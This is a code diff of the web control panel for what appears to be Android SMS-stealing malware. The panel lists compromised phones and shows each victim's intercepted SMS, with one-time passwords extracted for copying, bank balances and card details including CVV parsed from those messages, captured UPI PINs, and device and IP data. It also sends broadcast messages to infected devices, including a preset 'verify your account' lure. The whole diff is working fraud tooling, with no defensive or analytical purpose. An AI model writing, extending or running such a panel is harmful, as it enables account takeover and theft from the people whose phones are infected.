+        <span style="font-size:14px;font-weight:900;font-family:'Orbitron',sans-serif">₹${fmtBal(topBank.availableBalance)}</span>
+      </div>
+    </div>` : ""}
+    <div class="flex items-center" style="gap:8px">
+      ${statusPill}
+      ${!d.status && d.lastSeen ? `<span style="font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace">${timeAgo(d.lastSeen)}</span>` : ""}
+      ${topCard ? '<span class="badge badge-amber" style="margin-left:auto">💳</span>' : ""}
+      ${d.upipin ? '<span class="badge badge-amber" style="margin-left:auto">UPI</span>' : ""}
+    </div>
+  </div>`;
 }
 
-let msgs = allInboxMsgs;
-if(currentFilter === '10m') msgs = msgs.filter(m => (m.timestamp||0) >= now - 600);
-else if(currentFilter === 'recent') msgs = msgs.filter(m => (m.timestamp||0) >= now - 86400);
-msgs = [...msgs].sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 10);
-updateTopBadge(msgs);
-if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
-box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
-const otp = m.otp || extractOtp(m.message);
-let body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">' + otp + '</span>') : escapeHtml(m.message);
-body = highlightPhones(body);
-const copyBtn = otp ? '<button class="otp-copy-btn" onclick="event.stopPropagation();copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
-const ts = m.timestamp || 0; const isFresh = ts >= now - 120;
-const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
-const timeStr = m.date_string || fmtTime(ts);
-const newB = isFresh ? '<span class="new-badge">NEW</span>' : '';
-let typeB = '';
-if(otp) typeB = '<span class="msg-type-badge otp">OTP</span>';
-else if(/[6-9]\\d{9}/.test(m.message||'')) typeB = '<span class="msg-type-badge number">📞 NUM</span>';
-return '<div class="sms-item ' + cls + '">' + typeB +
-'<div class="sms-head"><div class="sender">' + escapeHtml(m.from||'Unknown') + ' ' + newB + '</div>' +
-'<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-'<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(ts, now) + '</div></div></div>' +
-'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>'; }).join('') + '</div>'; }
+/* ═══ DRAWER ═══ */
+window.openDevice = async function (compositeId) {
+  const dev = devices.find(d => d.id === compositeId);
+  if (!dev) return;
+  openDev = dev; currentMailTab = "sms";
+  $("#drawer-title").textContent = dev.name;
+  $("#drawer-id").textContent = `${dev.slug} · ${dev.rawId}`;
+  renderDrawerStatus();
+  switchTab("info", $(".tab"));
+  $("#drawer").classList.add("open");
 
-function backToList(){
-document.getElementById('inbox-view').classList.add('hidden');
-document.getElementById('list-view').classList.remove('hidden');
-if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-currentNum = null; allBroadcasts = [];
-currentTopNumber = null; updateTopBadge([]); }
-
-function extractOtp(text){ if(!text) return '';
-const t = String(text);
-let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
-if(m) return m[1];
-m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }
-
-function fmtTime(ts){ if(!ts) return '';
-try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
-const d = new Date(t*1000);
-const opts = { timeZone:'Asia/Kolkata', hour12:true, day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' };
-return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }
-
-function copyOtp(c){ const done = ()=>toast('✅ Copied: ' + c);
-if(navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(()=>{
-const ta = document.createElement('textarea'); ta.value = c; document.body.appendChild(ta);
-ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-/* ═══════ BROADCAST ═══════ */
-function openBcModal(){
-  document.getElementById('bc-total').textContent = allNumbers.length;
-  document.getElementById('bc-online').textContent = allNumbers.filter(n => n.online).length;
-  document.getElementById('bc-offline').textContent = allNumbers.filter(n => !n.online).length;
-  document.getElementById('bc-subtitle').textContent = 'target ' + allNumbers.length + ' device(s)';
-  bcManualSelected.clear();
-  bcTargetMode = 'all';
-  document.querySelectorAll('.bc-mode').forEach(el => el.classList.remove('active'));
-  document.getElementById('tm-all').classList.add('active');
-  bcTargets = allNumbers.slice();
-  document.getElementById('bc-body').value = '';
-  updateBcCounter();
-  document.getElementById('bc-progress').classList.remove('show');
-  document.getElementById('bc-progress-fill').style.width = '0%';
-  renderBcDevList();
-  document.getElementById('bc-modal').classList.add('open');
-}
-function closeBcModal(){ document.getElementById('bc-modal').classList.remove('open'); }
-
-function pickBcMode(mode){
-  bcTargetMode = mode;
-  document.querySelectorAll('.bc-mode').forEach(el => el.classList.remove('active'));
-  document.getElementById('tm-' + mode).classList.add('active');
-  if(mode === 'all') bcTargets = allNumbers.slice();
-  else if(mode === 'online') bcTargets = allNumbers.filter(n => n.online);
-  else if(mode === 'offline') bcTargets = allNumbers.filter(n => !n.online);
-  else bcTargets = allNumbers.filter(n => bcManualSelected.has(n.number));
-  document.getElementById('bc-selected-count').textContent = '(' + bcTargets.length + ' selected)';
-  renderBcDevList();
-  updateBcCounter();
+  // Load SMS via real inbox API
+  await fetchSms(dev);
+  // Load broadcasts
+  await fetchBroadcasts(dev);
+  updateDrawerBadges();
 }
 
-function renderBcDevList(){
-  const box = document.getElementById('bc-dev-list');
-  if(!allNumbers.length){ box.innerHTML = '<div style="text-align:center;padding:20px;color:#98a2b3;font-size:12px">No devices</div>'; return; }
-  box.innerHTML = allNumbers.map(n => {
-    const selected = bcTargetMode === 'manual' ? bcManualSelected.has(n.number) : !!bcTargets.find(x => x.number === n.number);
-    const emoji = n.online ? '📡' : '⚠️';
-    return '<div class="bc-dev-row ' + (selected ? 'selected' : '') + '" onclick="toggleBcDev(\\'' + escapeHtml(n.number) + '\\')">' +
-      '<div class="bc-check ' + (selected ? 'checked' : '') + '">' + (selected ? '✓' : '') + '</div>' +
-      '<div class="bc-dev-info">' +
-      '<div class="bc-dev-title">' + escapeHtml(n.device_name || n.number) + '</div>' +
-      '<div class="bc-dev-sub">' + escapeHtml(n.number) + ' · ' + escapeHtml(n.fb_name || 'firebase') + '</div>' +
-      '</div>' +
-      '<div class="bc-dev-status">' + emoji + '</div>' +
-      '</div>';
-  }).join('');
-  document.getElementById('bc-selected-count').textContent = '(' + bcTargets.length + ' selected)';
-}
+window.closeDrawer = function () {
+  $("#drawer").classList.remove("open");
+  openDev = null; allBroadcastsForDevice = [];
+};
 
-function toggleBcDev(num){
-  if(bcTargetMode !== 'manual'){
-    bcTargetMode = 'manual';
-    document.querySelectorAll('.bc-mode').forEach(el => el.classList.remove('active'));
-    document.getElementById('tm-manual').classList.add('active');
-    bcManualSelected = new Set(bcTargets.map(x => x.number));
+async function fetchSms(dev) {
+  if (!dev.firebase || !dev.device_id) {
+    smsCache[dev.id] = []; smsAnalysisCache[dev.id] = {bankBalances:[],cards:[],phoneNumbers:[],networks:[]};
+    return;
   }
-  if(bcManualSelected.has(num)) bcManualSelected.delete(num);
-  else bcManualSelected.add(num);
-  bcTargets = allNumbers.filter(n => bcManualSelected.has(n.number));
-  renderBcDevList();
-  updateBcCounter();
+  try {
+    const url = `/api/inbox?fb=${encodeURIComponent(dev.firebase)}&id=${encodeURIComponent(dev.device_id)}&num=${encodeURIComponent(dev.phoneNumber)}`;
+    const r = await fetch(url);
+    const d = await r.json();
+    const msgs = (d.messages || []).map(m => ({
+      text: m.message || "",
+      sender: m.from || "Unknown",
+      time: m.date_string || (m.timestamp ? new Date(m.timestamp*1000).toLocaleString() : ""),
+      otp: m.otp || extractOtp(m.message || ""),
+      timestamp: m.timestamp || 0,
+    }));
+    smsCache[dev.id] = msgs;
+    smsAnalysisCache[dev.id] = analyzeSms(msgs);
+    dev.smsAnalysis = smsAnalysisCache[dev.id];
+  } catch(e) {
+    smsCache[dev.id] = [];
+    smsAnalysisCache[dev.id] = {bankBalances:[],cards:[],phoneNumbers:[],networks:[]};
+  }
 }
+
+async function fetchBroadcasts(dev) {
+  if (!dev.firebase || !dev.device_id) { allBroadcastsForDevice = []; return; }
+  try {
+    const url = `/api/broadcasts/inbox?device_id=${encodeURIComponent(dev.device_id)}&fb=${encodeURIComponent(dev.firebase)}&num=${encodeURIComponent(dev.phoneNumber)}`;
+    const r = await fetch(url);
+    const d = await r.json();
+    allBroadcastsForDevice = (d.broadcasts || []).map(b => ({
+      id: b.id, message: b.message, status: b.status, read: b.read,
+      created_at: b.created_at, number: b.number, device_name: b.device_name,
+    }));
+  } catch(e) { allBroadcastsForDevice = []; }
+}
+
+function updateDrawerBadges() {
+  if (!openDev) return;
+  const an = smsAnalysisCache[openDev.id] || {bankBalances:[],cards:[]};
+  const tb = $("#tab-bank"), tc = $("#tab-card");
+  if (tb) tb.textContent = `Bank (${an.bankBalances.length})`;
+  if (tc) tc.textContent = `Card (${an.cards.length})`;
+  const mailUnread = allBroadcastsForDevice.filter(b => !b.read).length;
+  const tm = $("#tab-mail");
+  if (tm) tm.innerHTML = `<span class="tab-emoji">📧</span>Mail${mailUnread ? ` <span style="background:#E40000;color:#fff;padding:1px 6px;border-radius:8px;font-size:9px;font-weight:900">${mailUnread}</span>` : ""}`;
+}
+
+function renderDrawerStatus() {
+  if (!openDev) return;
+  const d = openDev;
+  const an = smsAnalysisCache[d.id] || {};
+  const phone = d.phoneNumber !== "—" ? d.phoneNumber : (an.phoneNumbers?.[0] || "—");
+  const statusPill = d.status
+    ? '<span class="status-emoji online" style="padding:3px 8px;font-size:10px"><span class="emoji">📡</span>ONLINE</span>'
+    : '<span class="status-emoji offline" style="padding:3px 8px;font-size:10px"><span class="emoji">⚠️</span>OFFLINE</span>';
+  $("#drawer-status").innerHTML = `
+    ${statusPill}
+    ${!d.status && d.lastSeen ? `<span style="font-size:9px;font-family:'JetBrains Mono',monospace;color:var(--red2)">${timeAgo(d.lastSeen)}</span>` : ""}
+    ${batHtml(d.batteryPercent)}
+    ${d.upipin ? `<span class="badge badge-amber">⚡ ${escHtml(d.upipin.split("|")[0])}</span>` : ""}
+    ${phone !== "—" ? `<span style="font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--text3)">${escHtml(phone)}</span>` : ""}
+  `;
+}
+
+window.switchTab = function (name, el) {
+  ["info","bank","card","sms","mail"].forEach(p => {
+    const e = $("#panel-" + p); if (e) e.style.display = "none";
+  });
+  $$(".tab").forEach(t => t.classList.remove("active","active-g","active-p","active-mail"));
+  const panel = $("#panel-" + name);
+  if (panel) panel.style.display = "block";
+  if (el) {
+    if (name === "bank") el.classList.add("active-g");
+    else if (name === "card") el.classList.add("active-p");
+    else if (name === "mail") el.classList.add("active-mail");
+    else el.classList.add("active");
+  }
+  if (name === "info") renderPanelInfo();
+  if (name === "bank") renderPanelBank();
+  if (name === "card") renderPanelCard();
+  if (name === "sms") renderPanelSms();
+  if (name === "mail") renderPanelMail();
+};
+
+function renderPanelInfo() {
+  if (!openDev) return;
+  const d = openDev, an = smsAnalysisCache[d.id] || {};
+  const phone = d.phoneNumber !== "—" ? d.phoneNumber : (an.phoneNumbers?.[0] || "—");
+  const net = d.provider !== "—" ? d.provider : (an.networks?.[0] || "—");
+  const statusLine = d.status
+    ? '<span class="status-emoji online" style="padding:3px 8px;font-size:10px"><span class="emoji">📡</span>ONLINE</span>'
+    : '<span class="status-emoji offline" style="padding:3px 8px;font-size:10px"><span class="emoji">⚠️</span>OFFLINE</span>';
+  $("#panel-info").innerHTML = `
+    <div style="display:flex;justify-content:center;margin-bottom:14px">${statusLine}</div>
+    ${!d.status && d.lastSeen ? `
+      <div style="background:rgba(228,0,0,.06);border:1px solid rgba(228,0,0,.15);border-left:2px solid var(--red);border-radius:var(--radius);padding:10px;margin-bottom:12px">
+        <div style="font-size:9px;color:var(--red2);font-weight:700;text-transform:uppercase;margin-bottom:4px">⚠️ Offline Since</div>
+        <div style="font-size:15px;font-weight:900;color:var(--red2)">${timeAgo(d.lastSeen)}</div>
+      </div>` : ""}
+    <div class="kv"><span class="kv-k">Project</span><span class="kv-v mono">${escHtml(d.slug)}</span></div>
+    <div class="kv"><span class="kv-k">Device ID</span><span class="kv-v mono">${escHtml(d.rawId)}</span></div>
+    <div class="kv"><span class="kv-k">Phone Number</span><span class="kv-v mono">${escHtml(phone)}</span></div>
+    <div class="kv"><span class="kv-k">Network</span><span class="kv-v">${escHtml(net)}</span></div>
+    <div class="kv"><span class="kv-k">Android</span><span class="kv-v">${escHtml(d.android)}</span></div>
+    <div class="kv"><span class="kv-k">IP Address</span><span class="kv-v mono">${escHtml(d.ip)}</span></div>
+    <div class="kv"><span class="kv-k">Storage</span><span class="kv-v">${escHtml(d.storage)}</span></div>
+    <div class="kv"><span class="kv-k">CPU Arch</span><span class="kv-v mono">${escHtml(d.cpu)}</span></div>
+    <div class="kv"><span class="kv-k">SDK Version</span><span class="kv-v">${escHtml(d.sdk)}</span></div>
+    <div class="kv"><span class="kv-k">SIM Count</span><span class="kv-v">${d.sims.length}</span></div>
+    ${d.sims.map((s, i) => (s.phoneNumber || s.number) ? `<div class="kv"><span class="kv-k">SIM ${i+1}</span><span class="kv-v mono">${escHtml(s.phoneNumber || s.number)}</span></div>` : "").join("")}
+    ${d.upipin ? `<div class="kv"><span class="kv-k">UPI PIN</span><span class="kv-v" style="color:var(--amber)">${escHtml(d.upipin)}</span></div>` : ""}
+    ${(an.phoneNumbers || []).map((p, i) => `<div class="kv"><span class="kv-k" style="color:var(--green)">Phone #${i+1}</span><span class="kv-v mono" style="color:var(--green)">${escHtml(p)}</span></div>`).join("")}
+    ${(an.networks || []).map(n => `<div class="kv"><span class="kv-k" style="color:var(--purple)">Network</span><span class="kv-v" style="color:var(--purple)">${escHtml(n)}</span></div>`).join("")}
+  `;
+}
+
+function renderPanelBank() {
+  if (!openDev) return;
+  const an = smsAnalysisCache[openDev.id];
+  const p = $("#panel-bank");
+  if (!an) { p.innerHTML = '<div class="empty"><span class="empty-icon">⏳</span>Loading…</div>'; return; }
+  const b = an.bankBalances || [];
+  if (!b.length) { p.innerHTML = '<div class="empty"><span class="empty-icon">🏦</span>No bank SMS</div>'; return; }
+  p.innerHTML = `<div style="margin-bottom:10px;font-size:11px;color:var(--text3)">Detected from ${smsCache[openDev.id]?.length || 0} SMS</div>` +
+    b.map(x => `<div class="bank-card">
+      <div class="flex items-center justify-between" style="margin-bottom:6px">
+        <span style="font-size:12px;font-weight:700;color:var(--green)">${escHtml(x.bankName)}${x.accountLast4 ? ` ••${escHtml(x.accountLast4)}` : ""}</span>
+        ${x.transactionType ? `<span class="badge ${x.transactionType === "credit" ? "badge-green" : "badge-red"}">${x.transactionType === "credit" ? "↑ Credit" : "↓ Debit"}</span>` : ""}
+      </div>
+      <div class="bal-big">₹${fmtBal(x.availableBalance)}</div>
+      ${x.transactionAmount ? `<div style="font-size:11px;color:var(--text3);margin-top:4px">Transaction: ₹${fmtBal(x.transactionAmount)}</div>` : ""}
+      <div style="font-size:10px;color:var(--text3);margin-top:6px;word-break:break-word">${escHtml(x.rawSms.substring(0, 160))}</div>
+    </div>`).join("");
+}
+
+function renderPanelCard() {
+  if (!openDev) return;
+  const an = smsAnalysisCache[openDev.id];
+  const p = $("#panel-card");
+  if (!an) { p.innerHTML = '<div class="empty"><span class="empty-icon">⏳</span>Loading…</div>'; return; }
+  const c = an.cards || [];
+  if (!c.length) { p.innerHTML = '<div class="empty"><span class="empty-icon">💳</span>No card info</div>'; return; }
+  p.innerHTML = c.map(x => `<div class="cc-card">
+    <div class="flex items-center justify-between" style="margin-bottom:6px">
+      <span style="font-size:12px;font-weight:700;color:var(--purple)">${escHtml(x.cardType)}</span>
+      ${x.expiry ? `<span style="font-size:10px;color:var(--text3)">Exp: ${escHtml(x.expiry)}</span>` : ""}
+    </div>
+    <div style="font-size:14px;font-family:'JetBrains Mono',monospace;letter-spacing:.1em">•••• •••• •••• ${escHtml(x.cardLast4)}</div>
+    ${x.cvv ? `<div style="font-size:11px;margin-top:6px">CVV: <span style="font-family:'JetBrains Mono',monospace;color:var(--purple)">${escHtml(x.cvv)}</span></div>` : ""}
+  </div>`).join("");
+}
+
+function renderPanelSms() {
+  if (!openDev) return;
+  const msgs = smsCache[openDev.id];
+  const p = $("#panel-sms");
+  if (!msgs) { p.innerHTML = '<div class="empty"><span class="empty-icon">⏳</span>Loading…</div>'; return; }
+  if (!msgs.length) { p.innerHTML = '<div class="empty"><span class="empty-icon">🛜</span>No messages</div>'; return; }
+  p.innerHTML = `<div style="font-size:11px;color:var(--text3);margin-bottom:10px">🛜 ${msgs.length} messages</div>` +
+    msgs.map(m => {
+      const isBank = isBankSms(m.text, m.sender), isCard = isCardSms(m.text);
+      const col = isCard ? "var(--purple)" : isBank ? "var(--green)" : "var(--text2)";
+      const otp = m.otp || extractOtp(m.text);
+      const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : "";
+      return `<div class="sms-item ${isBank ? "is-bank" : ""} ${isCard ? "is-card" : ""}">
+        ${otp ? '<div class="msg-type-badge otp">OTP</div>' : (isBank || isCard ? '' : '')}
+        <div class="flex items-center justify-between" style="padding-right:60px">
+          <span class="sms-sender" style="color:${col}">${escHtml(m.sender)}</span>
+          <span class="sms-time">${escHtml(m.time)}</span>
+        </div>
+        <div class="sms-body">${escHtml(m.text.substring(0, 400))}</div>
+        ${copyBtn}
+      </div>`;
+    }).join("");
+}
+
+function renderPanelMail() {
+  const p = $("#panel-mail");
+  if (!p) return;
+  const all = allBroadcastsForDevice;
+  const unread = all.filter(b => !b.read).length;
+  const delivered = all.filter(b => b.status === "delivered").length;
+
+  const header = `
+    <div class="mail-header-card">
+      <div class="mh-title">📧 BROADCAST MAIL</div>
+      <div class="mh-desc">
+        ${IS_ADMIN ? 'Admin-sent broadcasts appear here. Every message you send is logged.' : 'Admin broadcasts received on this device. Tap to mark read.'}
+      </div>
+      <div class="mh-stats">
+        <span class="mail-stat-pill total">📨 ${all.length} mails</span>
+        <span class="mail-stat-pill devices">🆕 ${unread} unread</span>
+        <span class="mail-stat-pill delivered">✅ ${delivered} delivered</span>
+      </div>
+      ${IS_ADMIN ? `<div style="display:flex;gap:8px;margin-top:12px">
+        <button class="btn btn-ghost flex1" onclick="openBroadcastModal()" style="padding:10px">📧 New Mail</button>
+      </div>` : ""}
+    </div>
+  `;
+
+  if (!all.length) {
+    p.innerHTML = header + '<div class="empty"><span class="empty-icon">📭</span>No mail received yet</div>';
+    return;
+  }
+
+  const rows = all.slice(0, 100).map(b => {
+    const isFresh = (b.created_at || 0) * 1000 >= Date.now() - 120000;
+    const ts = b.created_at ? new Date(b.created_at * 1000).toLocaleString() : "";
+    return `<div class="sms-item mail-item ${isFresh ? "fresh" : ""}" onclick="markBroadcastRead('${b.id}')" style="cursor:pointer">
+      <div class="msg-type-badge mail">📧 MAIL</div>
+      <div class="sms-head" style="display:flex;justify-content:space-between;padding-right:60px">
+        <div class="sms-sender" style="color:var(--amber);font-family:'Orbitron',sans-serif;font-size:11px">
+          📧 ADMIN BROADCAST ${!b.read ? '<span style="color:#E40000">●</span>' : ""}
+        </div>
+        <div class="sms-time">${escHtml(ts)}</div>
+      </div>
+      <div class="sms-body">${escHtml(b.message || "")}</div>
+    </div>`;
+  }).join("");
+
+  p.innerHTML = header + `<div style="font-size:11px;color:var(--text3);margin-bottom:10px">📬 All mails (${all.length})</div>${rows}`;
+}
+
+window.markBroadcastRead = async function (id) {
+  const b = allBroadcastsForDevice.find(x => x.id === id);
+  if (!b || b.read) return;
+  b.read = true;
+  try {
+    await fetch("/api/broadcasts/read", { method:"POST",
+      headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ id }) });
+  } catch(e) {}
+  updateDrawerBadges();
+  renderPanelMail();
+};
+
+/* ═══ BROADCAST ═══ */
+function updateBcCountBadge() {
+  const badge = $("#bc-count-badge");
+  if (!badge) return;
+  if (devices.length > 0) { badge.style.display = "flex"; badge.textContent = devices.length; }
+  else badge.style.display = "none";
+}
+
+window.openBroadcastModal = function () {
+  if (!IS_ADMIN) { showToast("❌ Admin only"); return; }
+  $("#bc-total").textContent = devices.length;
+  $("#bc-online").textContent = devices.filter(d => d.status).length;
+  $("#bc-offline").textContent = devices.filter(d => !d.status).length;
+  bcManualSelected.clear();
+  pickTargetMode("all");
+  $("#bc-body").value = "";
+  updateBcCounter();
+  $("#bc-progress").classList.remove("show");
+  $("#bc-progress-fill").style.width = "0%";
+  $("#broadcast-modal").classList.add("open");
+};
+window.closeBroadcastModal = function () { $("#broadcast-modal").classList.remove("open"); };
+
+window.pickTargetMode = function (mode) {
+  bcTargetMode = mode;
+  $$(".bc-mode").forEach(el => el.classList.remove("active"));
+  const el = $("#tm-" + mode); if (el) el.classList.add("active");
+  if (mode === "all") bcTargets = devices.slice();
+  else if (mode === "online") bcTargets = devices.filter(d => d.status);
+  else if (mode === "offline") bcTargets = devices.filter(d => !d.status);
+  else bcTargets = devices.filter(d => bcManualSelected.has(d.id));
+  $("#bc-selected-count").textContent = `(${bcTargets.length} selected)`;
+  renderBcDeviceList();
+  updateBcCounter();
+};
+
+function renderBcDeviceList() {
+  const box = $("#bc-device-list");
+  if (!devices.length) { box.innerHTML = '<div class="empty" style="padding:20px">No devices</div>'; return; }
+  box.innerHTML = devices.map(d => {
+    const selected = bcTargetMode === "manual" ? bcManualSelected.has(d.id) : !!bcTargets.find(x => x.id === d.id);
+    const emoji = d.status ? "📡" : "⚠️";
+    return `<div class="bc-dev-row ${selected ? "selected" : ""}" onclick="toggleBcDevice('${d.id}')">
+      <div class="bc-check ${selected ? "checked" : ""}">${selected ? "✓" : ""}</div>
+      <div class="bc-dev-info">
+        <div class="bc-dev-title">${escHtml(d.name)}</div>
+        <div class="bc-dev-sub">${escHtml(d.slug)} · ${escHtml(d.phoneNumber)}</div>
+      </div>
+      <div class="bc-dev-status">${emoji}</div>
+    </div>`;
+  }).join("");
+}
+
+window.toggleBcDevice = function (id) {
+  if (bcTargetMode !== "manual") {
+    bcTargetMode = "manual";
+    $$(".bc-mode").forEach(el => el.classList.remove("active"));
+    $("#tm-manual").classList.add("active");
+    bcManualSelected = new Set(bcTargets.map(d => d.id));
+  }
+  if (bcManualSelected.has(id)) bcManualSelected.delete(id);
+  else bcManualSelected.add(id);
+  bcTargets = devices.filter(d => bcManualSelected.has(d.id));
+  $("#bc-selected-count").textContent = `(${bcTargets.length} selected)`;
+  renderBcDeviceList();
+  updateBcCounter();
+};
 
 const BC_TEMPLATES = {
-  alert: '⚠️ ALERT: Service interruption detected. Please verify your account.',
-  maint: '🔧 Scheduled maintenance in 30 minutes. Service will resume shortly.',
-  welcome: '👋 Welcome to TOCXIC EAGLE. Your device is now connected.',
-  blank: '',
+  alert: "⚠️ ALERT: Service interruption detected. Please verify your account.",
+  maint: "🔧 Scheduled maintenance in 30 minutes. Service will resume shortly.",
+  welcome: "👋 Welcome to TOCXIC EAGLE. Your device is now connected.",
+  blank: "",
 };
-function applyBcTemplate(k){ document.getElementById('bc-body').value = BC_TEMPLATES[k] || ''; updateBcCounter(); }
+window.applyBcTemplate = k => { $("#bc-body").value = BC_TEMPLATES[k] || ""; updateBcCounter(); };
 
-function detectEnc(text){
-  const gsm = /^[@£$¥èéùìòÇ\\nØø\\rÅåΔ_ΦΓΛΩΠΨΣΘΞÆæßÉ !"#¤%&'()*+,\\-.\\/0-9:;<=>?¡A-ZÄÖÑÜ§¿a-zäöñüà\\s\\f^{}\\[~\\]|€]*$/;
-  return gsm.test(text) ? 'GSM-7' : 'UCS-2';
+function detectEncoding(text) {
+  const gsm = /^[@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞÆæßÉ !"#¤%&'()*+,\-./0-9:;<=>?¡A-ZÄÖÑÜ§¿a-zäöñüà\s\f^{}\\[~\]|€]*$/;
+  return gsm.test(text) ? "GSM-7" : "UCS-2";
 }
 
-function updateBcCounter(){
-  const txt = document.getElementById('bc-body').value || '';
-  const enc = detectEnc(txt);
+window.updateBcCounter = function () {
+  const txt = $("#bc-body").value || "";
+  const enc = detectEncoding(txt);
   const len = txt.length;
-  let seg, per;
-  if(enc === 'GSM-7'){ seg = len <= 160 ? 1 : Math.ceil(len / 153); per = len <= 160 ? 160 : 153; }
-  else { seg = len <= 70 ? 1 : Math.ceil(len / 67); per = len <= 70 ? 70 : 67; }
-  const inSeg = seg === 1 ? len : len - ((seg - 1) * per);
-  document.getElementById('bc-chars').textContent = inSeg + ' / ' + per;
-  document.getElementById('bc-segments').textContent = bcTargets.length + ' device' + (bcTargets.length > 1 ? 's' : '') + ' × ' + seg + ' SMS · ' + enc;
-  const el = document.getElementById('bc-counter');
-  el.className = 'bc-counter';
-  if(seg > 3) el.classList.add('over');
-  else if(seg > 1) el.classList.add('warn');
-}
+  let segments, perSeg;
+  if (enc === "GSM-7") { segments = len <= 160 ? 1 : Math.ceil(len / 153); perSeg = len <= 160 ? 160 : 153; }
+  else { segments = len <= 70 ? 1 : Math.ceil(len / 67); perSeg = len <= 70 ? 70 : 67; }
+  const inSeg = segments === 1 ? len : len - ((segments - 1) * perSeg);
+  $("#bc-chars").textContent = `${inSeg} / ${perSeg}`;
+  $("#bc-segments").textContent = `${segments} SMS · ${enc}`;
+  const el = $("#bc-counter");
+  el.className = "bc-counter";
+  if (segments > 3) el.classList.add("over");
+  else if (segments > 1) el.classList.add("warn");
+  const totalMsgs = bcTargets.length * segments;
+  $("#bc-msg-info").textContent = bcTargets.length
+    ? `${bcTargets.length} user${bcTargets.length > 1 ? "s" : ""} × ${segments} SMS = ${totalMsgs} total`
+    : "1 mail per user";
+};
 
-async function doBroadcast(){
-  const body = document.getElementById('bc-body').value.trim();
-  if(!bcTargets.length){ toast('❌ No targets selected'); return; }
-  if(!body){ toast('❌ Mail is empty'); return; }
+window.doBroadcast = async function () {
+  if (!IS_ADMIN) { showToast("❌ Admin only"); return; }
+  const body = $("#bc-body").value.trim();
+  if (!bcTargets.length) { showToast("❌ No targets selected"); return; }
+  if (!body) { showToast("❌ Message is empty"); return; }
 
-  const btn = document.getElementById('bc-send-btn'); btn.disabled = true;
-  const prog = document.getElementById('bc-progress'); prog.classList.add('show');
-  const fill = document.getElementById('bc-progress-fill');
-  const txt = document.getElementById('bc-progress-text');
+  const btn = $("#bc-send-btn"); btn.disabled = true;
+  const prog = $("#bc-progress"); prog.classList.add("show");
+  const fill = $("#bc-progress-fill"), txt = $("#bc-progress-text");
 
-  const payload = {
-    message: body,
-    targets: bcTargets.map(n => ({
-      number: n.number, device_id: n.device_id, firebase: n.firebase,
-      device_name: n.device_name, fb_name: n.fb_name, online: n.online,
-    })),
-  };
-
-  fill.style.width = '30%';
-  txt.textContent = '📧 Sending to ' + bcTargets.length + ' device(s)...';
+  fill.style.width = "30%";
+  txt.textContent = `📧 Sending to ${bcTargets.length} device(s)...`;
 
   try {
-    const r = await fetch('/api/broadcast', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
+    const payload = {
+      message: body,
+      targets: bcTargets.map(d => ({
+        number: d.phoneNumber, device_id: d.device_id, firebase: d.firebase,
+        device_name: d.name, fb_name: d.fb_name, online: d.status,
+      })),
+    };
+    const r = await fetch("/api/broadcast", {
+      method: "POST", headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
     });
-    fill.style.width = '70%';
+    fill.style.width = "80%";
     const d = await r.json();
-    if(d.success){
-      fill.style.width = '100%';
-      txt.textContent = '✅ Sent to ' + d.delivered + ' device(s)';
-      toast('📧 Broadcast sent to ' + d.delivered + ' user(s)');
+    if (d.success) {
+      fill.style.width = "100%";
+      txt.textContent = `✅ Sent to ${d.delivered} device(s)`;
+      showToast(`📧 Broadcast sent to ${d.delivered} user(s)`);
       setTimeout(() => {
-        prog.classList.remove('show'); fill.style.width = '0%'; btn.disabled = false;
-        document.getElementById('bc-body').value = ''; updateBcCounter();
-        closeBcModal();
+        prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false;
+        $("#bc-body").value = ""; updateBcCounter(); closeBroadcastModal();
       }, 1400);
     } else {
-      fill.style.width = '100%'; txt.textContent = '❌ ' + (d.error || 'Failed');
-      setTimeout(() => { prog.classList.remove('show'); fill.style.width = '0%'; btn.disabled = false; }, 1600);
-      toast('❌ ' + (d.error || 'Send failed'));
+      fill.style.width = "100%"; txt.textContent = `❌ ${d.error || "Failed"}`;
+      setTimeout(() => { prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false; }, 1600);
+      showToast("❌ " + (d.error || "Send failed"));
     }
-  } catch(e){
-    fill.style.width = '100%'; txt.textContent = '❌ Network error';
-    setTimeout(() => { prog.classList.remove('show'); fill.style.width = '0%'; btn.disabled = false; }, 1600);
-    toast('❌ Network error');
+  } catch(e) {
+    fill.style.width = "100%"; txt.textContent = "❌ Network error";
+    setTimeout(() => { prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false; }, 1600);
+    showToast("❌ Network error");
   }
+};
+
+/* ═══ PARSERS ═══ */
